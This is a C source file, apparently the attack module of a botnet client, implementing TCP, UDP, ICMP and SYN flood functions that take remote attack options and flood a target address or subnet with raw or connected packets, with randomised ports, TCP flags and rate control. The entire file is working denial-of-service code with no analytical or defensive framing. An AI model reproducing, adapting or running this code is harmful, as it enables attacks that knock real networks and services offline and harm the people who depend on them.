#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>

#include "utils.h"
#include "rand.h"
#include "methods.h"
#include "attacks.h"

static void methods_waitfor_kill(void)
{
	// Replace return functions and wait for the kill command
	while (1)
		sleep(1);
}

static unsigned short in_cksum(unsigned short *addr, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	while (nleft > 1) 
	{
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) 
	{
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}
	
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

void methods_tcp(uint32_t target, char *opts, int opts_len)
{
	// Attack options
	int payload_len = 0, i, socket_fd = -1;
	char *data;
	struct sockaddr_in addr;

	char *payload = attacks_option_string(opts, (uint8_t)OPT_PAYLOAD, &payload_len, opts_len);
	uint16_t data_len = attacks_option_uint16(opts, (uint8_t)OPT_LEN, opts_len);
	uint16_t dest_port = attacks_option_uint16(opts, (uint8_t)OPT_PORT, opts_len);
	uint16_t packets = attacks_option_uint16(opts, (uint8_t)OPT_PACKETS, opts_len);
	uint16_t pps = attacks_option_uint16(opts, (uint8_t)OPT_PPS, opts_len);
	uint8_t netmask = attacks_option_uint8(opts, (uint8_t)OPT_NETMASK, opts_len);

	rand_init();

	if (dest_port == 0xFFFF)
		dest_port = rand_next() % 0xFFFF;

	if (payload_len < 1)
	{
		if (data_len == 0xFFFF || data_len > TCP_MAX_SIZE)
			data_len = 1024 + rand_next() % 0xFF;

		data = malloc(data_len * sizeof(char *));
		if (!data)
		{
			methods_waitfor_kill();
			return;
		}

		rand_string(data, data_len);
	}
	else
	{
		data = malloc(payload_len * sizeof(char *));
		data_len = payload_len;

		if (!data)
		{
			free(payload);
			methods_waitfor_kill();
			return;
		}

		utils_memcpy(data, payload, payload_len);
		free(payload);
	}

#ifdef DEBUG
	if (netmask != 0xFF && netmask < 32)
		printf("[methods] TCP Flood has has been started (%d.%d.%d.%d/%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf, netmask);
	else
		printf("[methods] TCP Flood has has been started (%d.%d.%d.%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf);
#endif

	if (packets != 0xFFFF)
	{
		while (1)
		{
			if (socket_fd == -1)
			{
				if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
				{
					free(data);
					methods_waitfor_kill();
					return;
				}

				utils_memset(&addr, 0, sizeof(addr));
				addr.sin_family = AF_INET;
				addr.sin_port = htons(dest_port);

				if (netmask != 0xFF && netmask < 32)
					addr.sin_addr.s_addr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
				else
					addr.sin_addr.s_addr = target;

				if (connect(socket_fd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) == -1)
				{
					close(socket_fd);
					socket_fd = -1;
				}
			}
			else
			{
				for (i = 0; i < packets; i++)
				{
					if (payload_len < 1)
						rand_string(data, data_len);

					send(socket_fd, data, data_len, MSG_NOSIGNAL);
				}

				close(socket_fd);
				socket_fd = -1;
			}
		}

		methods_waitfor_kill();
		return;
	}

	while (1)
	{
		if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
			free(data);
			methods_waitfor_kill();
			return;
		}

		utils_memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_port = htons(dest_port);

		if (netmask != 0xFF && netmask < 32)
			addr.sin_addr.s_addr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
		else
			addr.sin_addr.s_addr = target;

		if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
		{
			close(socket_fd);
			socket_fd = -1;
			continue;
		}

		break;
	}

	if (pps != 0xFFFF)
	{
		while (1)
		{
			int utime = time(NULL), sent = 0;

			while (1)
			{
				if (time(NULL) > (utime + 1) || sent++ >= pps)
				{
					sleep(1);
					break;
				}

				if (payload_len < 1)
					rand_string(data, data_len);
				
				send(socket_fd, data, data_len, MSG_NOSIGNAL);
			}

			sleep(1);
		}

		close(socket_fd);
		methods_waitfor_kill();
		return;
	}

	while (1)
	{
		if (payload_len < 1)
			rand_string(data, data_len);

		send(socket_fd, data, data_len, MSG_NOSIGNAL);
	}

	free(data);
	methods_waitfor_kill();
	return;
}

void methods_udp(uint32_t target, char *opts, int opts_len)
{
	// Attack options
	int payload_len = 0, i, socket_fd = -1;
	char *data;
	struct sockaddr_in addr;
	struct sockaddr_in bind_addr;

	char *payload = attacks_option_string(opts, (uint8_t)OPT_PAYLOAD, &payload_len, opts_len);
	uint16_t data_len = attacks_option_uint16(opts, (uint8_t)OPT_LEN, opts_len);
	uint16_t dest_port = attacks_option_uint16(opts, (uint8_t)OPT_PORT, opts_len);
	uint16_t packets = attacks_option_uint16(opts, (uint8_t)OPT_PACKETS, opts_len);
	uint16_t pps = attacks_option_uint16(opts, (uint8_t)OPT_PPS, opts_len);
	uint8_t no_bind = attacks_option_uint8(opts, (uint8_t)OPT_NOBIND, opts_len);
	uint8_t netmask = attacks_option_uint8(opts, (uint8_t)OPT_NETMASK, opts_len);

	rand_init();

	if (dest_port == 0xFFFF)
		dest_port = rand_next() % 0xFFFF;

	if (payload_len < 1)
	{
		if (data_len == 0xFFFF || data_len > UDP_MAX_SIZE)
			data_len = 1024 + rand_next() % 0xFF;

		data = malloc(data_len * sizeof(char *));
		if (!data)
		{
			methods_waitfor_kill();
			return;
		}

		rand_string(data, data_len);
	}
	else
	{
		data = malloc(payload_len * sizeof(char *));
		data_len = payload_len;

		if (!data)
		{
			free(payload);
			methods_waitfor_kill();
			return;
		}

		utils_memcpy(data, payload, payload_len);
		free(payload);
	}


#ifdef DEBUG
	if (no_bind == 1)
	{
		if (netmask != 0xFF && netmask < 32)
			printf("[methods] UDP Flood has been started in NO-BIND mode (%d.%d.%d.%d/%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf, netmask);
		else
			printf("[methods] UDP Flood has been started in NO-BIND mode (%d.%d.%d.%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf);
	}
	else
	{
		if (netmask != 0xFF && netmask < 32)
			printf("[methods] UDP Flood has been started in BIND mode (%d.%d.%d.%d/%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf, netmask);
		else
			printf("[methods] UDP Flood has been started in BIND mode (%d.%d.%d.%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf);
	}
#endif

	if (packets != 0xFFFF)
	{
		while (1)
		{
			if (socket_fd == -1)
			{
				if ((socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
				{
					free(data);
					methods_waitfor_kill();
					return;
				}

				utils_memset(&addr, 0, sizeof(addr));
				addr.sin_family = AF_INET;
				addr.sin_port = htons(dest_port);

				if (netmask != 0xFF && netmask < 32)
					addr.sin_addr.s_addr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
				else
					addr.sin_addr.s_addr = target;

				if (no_bind != 1)
				{
					utils_memset(&bind_addr, 0, sizeof(bind_addr));
			        bind_addr.sin_family = AF_INET;
			        bind_addr.sin_port = htons(10000 + rand_next() % (0xFFFF - 10000));
			        bind_addr.sin_addr.s_addr = 0;

	        		bind(socket_fd, (struct sockaddr *)&bind_addr, (socklen_t)sizeof(bind_addr));
        		}

				if (connect(socket_fd, (struct sockaddr *)&addr, (socklen_t)sizeof(addr)) == -1)
				{
					close(socket_fd);
					socket_fd = -1;
				}
			}
			else
			{
				for (i = 0; i < packets; i++)
				{
					if (payload_len < 1)
						rand_string(data, data_len);

					send(socket_fd, data, data_len, MSG_NOSIGNAL);
				}

				close(socket_fd);
				socket_fd = -1;
			}
		}

		methods_waitfor_kill();
		return;
	}

	while (1)
	{
		if ((socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
		{
			free(data);
			methods_waitfor_kill();
			return;
		}

		utils_memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_port = htons(dest_port);
		
		if (netmask != 0xFF && netmask < 32)
			addr.sin_addr.s_addr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
		else
			addr.sin_addr.s_addr = target;

		if (no_bind != 1)
		{
			utils_memset(&bind_addr, 0, sizeof(bind_addr));
			bind_addr.sin_family = AF_INET;
			bind_addr.sin_port = htons(10000 + rand_next() % (0xFFFF - 10000));
			bind_addr.sin_addr.s_addr = 0;

	        bind(socket_fd, (struct sockaddr *)&bind_addr, (socklen_t)sizeof(bind_addr));
        }

		if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
		{
			close(socket_fd);
			socket_fd = -1;
			continue;
		}

		break;
	}

	if (pps != 0xFFFF)
	{
		while (1)
		{
			int utime = time(NULL), sent = 0;

			while (1)
			{
				if (time(NULL) > (utime + 1) || sent++ >= pps)
				{
					sleep(1);
					break;
				}

				if (payload_len < 1)
					rand_string(data, data_len);
				
				send(socket_fd, data, data_len, MSG_NOSIGNAL);
			}

			sleep(1);
		}

		close(socket_fd);
		methods_waitfor_kill();
		return;
	}

	while (1)
	{
		if (payload_len < 1)
			rand_string(data, data_len);

		send(socket_fd, data, data_len, MSG_NOSIGNAL);
	}

	free(data);
	methods_waitfor_kill();
	return;
}

void methods_icmp(uint32_t target, char *opts, int opts_len)
{
	struct icmp icmp;
	struct ip ip;
	struct sockaddr_in addr;
	int socket_fd, one = 1;
	char *data;

	uint16_t pps = attacks_option_uint16(opts, (uint8_t)OPT_PPS, opts_len);
	uint8_t netmask = attacks_option_uint8(opts, (uint8_t)OPT_NETMASK, opts_len);

	data = malloc(ICMP_STATIC_SIZE * sizeof(char *));
	if (!data)
	{
		methods_waitfor_kill();
		return;
	}

	if ((socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
	{
		free(data);
		methods_waitfor_kill();
		return;
	}

	if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
	{
		free(data);
		methods_waitfor_kill();
		return;
	}

#ifdef DEBUG
	if (netmask != 0xFF && netmask < 32)
		printf("[methods] ICMP Flood has been started (%d.%d.%d.%d/%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf, netmask);
	else
		printf("[methods] ICMP Flood has been started (%d.%d.%d.%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf);
#endif

	ip.ip_hl = 0x05;
	ip.ip_v = 0x4;
	ip.ip_tos = 0x0;
	ip.ip_len = htons(ICMP_STATIC_SIZE);
	ip.ip_id = htons(rand_next() % 0xFFFF);
	ip.ip_off = 0x0;
	ip.ip_ttl = 64;
	ip.ip_p = IPPROTO_ICMP;
	ip.ip_sum = 0x0;
	ip.ip_src.s_addr = local_addr;

	if (netmask != 0xFF && netmask < 32)
		ip.ip_dst.s_addr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
	else
		ip.ip_dst.s_addr = target;

	ip.ip_dst.s_addr = target;

	icmp.icmp_type = ICMP_ECHO;
	icmp.icmp_code = 0;
	icmp.icmp_id = htons(rand_next() % 0xFFFF);
	icmp.icmp_seq = 0;
	icmp.icmp_cksum = 0;
	
	utils_memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = ip.ip_dst.s_addr;

	if (pps != 0xFFFF)
	{
		while (1)
		{
			int utime = time(NULL), sent = 0;

			while (1)
			{
				if (time(NULL) > (utime + 1) || sent++ >= pps)
				{
					sleep(1);
					break;
				}

				utils_memset(data, 0, sizeof(data));

				if (netmask != 0xFF && netmask < 32)
				{
					ip.ip_dst.s_addr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
					utils_memset(&addr, 0, sizeof(addr));
					addr.sin_family = AF_INET;
					addr.sin_addr.s_addr = ip.ip_dst.s_addr;
				}

				ip.ip_id = htons(rand_next() % 0xFFFF);
				ip.ip_sum = in_cksum((unsigned short *)&ip, sizeof(ip));
				utils_memcpy(data, &ip, sizeof(ip));

				icmp.icmp_id = htons(rand_next() % 0xFFFF);
				icmp.icmp_cksum = in_cksum((unsigned short *)&icmp, 8);
				utils_memcpy(data + 20, &icmp, 8);

				sendto(socket_fd, data, ICMP_STATIC_SIZE, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr));
			}
		}

		close(socket_fd);
		methods_waitfor_kill();
		return;
	}

	while (1)
	{
		utils_memset(data, 0, sizeof(data));

		if (netmask != 0xFF && netmask < 32)
		{
			ip.ip_dst.s_addr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
			utils_memset(&addr, 0, sizeof(addr));
			addr.sin_family = AF_INET;
			addr.sin_addr.s_addr = ip.ip_dst.s_addr;
		}

		ip.ip_id = htons(rand_next() % 0xFFFF);
		ip.ip_sum = in_cksum((unsigned short *)&ip, sizeof(ip));
		utils_memcpy(data, &ip, sizeof(ip));

		icmp.icmp_id = htons(rand_next() % 0xFFFF);
		icmp.icmp_cksum = in_cksum((unsigned short *)&icmp, 8);
		utils_memcpy(data + 20, &icmp, 8);
		sendto(socket_fd, data, ICMP_STATIC_SIZE, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr));
	}

	close(socket_fd);
	methods_waitfor_kill();
	return;
}

void methods_syn(uint32_t target, char *opts, int opts_len)
{
	// Attack options
	int i, socket_fd = -1, one = 1;
	char *data, *packet, *pseudogram;
	struct sockaddr_in addr;
	struct iphdr *iph;
    struct tcphdr *tcph;
    struct pseudo_header psh;

	uint16_t data_len = attacks_option_uint16(opts, (uint8_t)OPT_LEN, opts_len);
	uint16_t dest_port = attacks_option_uint16(opts, (uint8_t)OPT_PORT, opts_len);
	uint16_t pps = attacks_option_uint16(opts, (uint8_t)OPT_PPS, opts_len);
	uint8_t netmask = attacks_option_uint8(opts, (uint8_t)OPT_NETMASK, opts_len);
	uint8_t multi_source = attacks_option_uint8(opts, (uint8_t)OPT_MULTISRC, opts_len);
	uint8_t rand_bits = attacks_option_uint8(opts, (uint8_t)OPT_RANDBITS, opts_len);
	
	rand_init();

	if (dest_port == 0xFFFF)
		dest_port = rand_next() % 0xFFFF;

	if (data_len == 0xFFFF || data_len > SYN_MAX_SIZE)
		data_len = 1 + rand_next() % 0xFF;

    if ((socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
    	methods_waitfor_kill();
    	return;
    }

    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1)
    {
    	close(socket_fd);
    	methods_waitfor_kill();
     	return;      
    }

	
    data = malloc((sizeof(iph) + sizeof(tcph) + data_len) * sizeof(char *));
    if (!data)
    {
    	close(socket_fd);
    	methods_waitfor_kill();
     	return;      
    }

    utils_memset(data, 0, sizeof(data));
    iph = (struct iphdr *)data;
    tcph = (struct tcphdr *)(data + sizeof(struct ip));

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
	iph->id = htonl(rand_next() % 0xFFFF);
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;
	iph->saddr = local_addr;

	if (netmask != 0xFF && netmask < 32)
		iph->daddr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
	else
		iph->daddr = target;

	iph->check = 0;
	iph->check = in_cksum((unsigned short *)data, iph->tot_len);

	tcph->source = htons((rand_next() % 55535) + 10000);
	tcph->dest = htons(dest_port);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(5840);
	tcph->check = 0;
	tcph->urg_ptr = 0;

	psh.source_address = iph->saddr;
	psh.dest_address = target;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);

	rand_string(data + sizeof(struct pseudo_header) + sizeof(struct tcphdr), data_len);

	pseudogram = malloc(sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len);
	if (!pseudogram)
	{
		free(data);
		close(socket_fd);
		methods_waitfor_kill();
		return;
	}

	utils_memset(pseudogram, 0, sizeof(pseudogram));
	utils_memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
	utils_memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + data_len);
	tcph->check = in_cksum((unsigned short *)pseudogram , sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len);

#ifdef DEBUG
	if (netmask != 0xFF && netmask < 32)
		printf("[methods] SYN Flood has been started (%d.%d.%d.%d/%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf, netmask);
	else
		printf("[methods] SYN Flood has been started (%d.%d.%d.%d)\n", target & 0xff, (target >> 8) & 0xff, (target >> 16) & 0xff, (target >> 24) & 0xf);
#endif

	utils_memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = iph->daddr;
	addr.sin_port = htons(dest_port);

    if (pps != 0xFFFF)
	{
		while (1)
		{
			int utime = time(NULL), sent = 0;

			while (1)
			{
				if (time(NULL) > (utime + 1) || sent++ >= pps)
				{
					sleep(1);
					break;
				}

				iph = (struct iphdr *)data;
			    tcph = (struct tcphdr *)(data + sizeof(struct ip));
			    
				if (netmask != 0xFF && netmask < 32)
				{
					iph->daddr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
					utils_memset(&addr, 0, sizeof(addr));
					addr.sin_family = AF_INET;
					addr.sin_addr.s_addr = iph->daddr;
				}
				
				iph->id = htonl(rand_next() % 0xFFFF);
				iph->check = 0;
				iph->check = in_cksum((unsigned short *)data, iph->tot_len);

				if (multi_source == 1)
					tcph->source = htons((rand_next() % 55535) + 10000);

				if (rand_bits == 1)
				{
					tcph->fin = (10 - (rand_next() % 5) % 2);
					tcph->rst = (10 - (rand_next() % 5) % 2);
					tcph->psh = (10 - (rand_next() % 5) % 2);
					tcph->ack = (10 - (rand_next() % 5) % 2);
					tcph->urg = (10 - (rand_next() % 5) % 2);
				}

				utils_memset(pseudogram, 0, sizeof(pseudogram));
				psh.source_address = iph->saddr;
				psh.dest_address = iph->daddr;
				psh.placeholder = 0;
				psh.protocol = IPPROTO_TCP;
				psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);

				utils_memset(pseudogram, 0, sizeof(pseudogram));
				utils_memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
				utils_memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + data_len);
				tcph->check = in_cksum((unsigned short *)pseudogram , sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len);

				rand_string(data + sizeof(struct pseudo_header) + sizeof(struct tcphdr), data_len);

				sendto(socket_fd, data, iph->tot_len, 0, (struct sockaddr *)&addr, (socklen_t)sizeof(addr));
			}
		}

		free(data);
		close(socket_fd);
		methods_waitfor_kill();
		return;
	}

	while (1)
	{
		iph = (struct iphdr *)data;
	    tcph = (struct tcphdr *)(data + sizeof(struct ip));

		if (netmask != 0xFF && netmask < 32)
		{
			iph->daddr = htonl(ntohl(target) + (((uint32_t)rand_next()) >> netmask));
			utils_memset(&addr, 0, sizeof(addr));
			addr.sin_family = AF_INET;
			addr.sin_addr.s_addr = iph->daddr;
		}

		iph->id = htonl(rand_next() % 0xFFFF);
		iph->check = 0;
		iph->check = in_cksum((unsigned short *)data, iph->tot_len);

		if (multi_source == 1)
			tcph->source = htons((rand_next() % 55535) + 10000);

		if (rand_bits == 1)
		{
			tcph->fin = (10 - (rand_next() % 5) % 2);
			tcph->rst = (10 - (rand_next() % 5) % 2);
			tcph->psh = (10 - (rand_next() % 5) % 2);
			tcph->ack = (10 - (rand_next() % 5) % 2);
			tcph->urg = (10 - (rand_next() % 5) % 2);
		}

		utils_memset(pseudogram, 0, sizeof(pseudogram));
		psh.source_address = iph->saddr;
		psh.dest_address = iph->daddr;
		psh.placeholder = 0;
		psh.protocol = IPPROTO_TCP;
		psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);

		utils_memset(pseudogram, 0, sizeof(pseudogram));
		utils_memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
		utils_memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + data_len);
		tcph->check = in_cksum((unsigned short *)pseudogram , sizeof(struct pseudo_header) + sizeof(struct tcphdr) + data_len);

		rand_string(data + sizeof(struct pseudo_header) + sizeof(struct tcphdr), data_len);

		sendto(socket_fd, data, iph->tot_len, 0, (struct sockaddr *)&addr, (socklen_t)sizeof(addr));
	}

    free(data);
    close(socket_fd);
	methods_waitfor_kill();
	return;
}
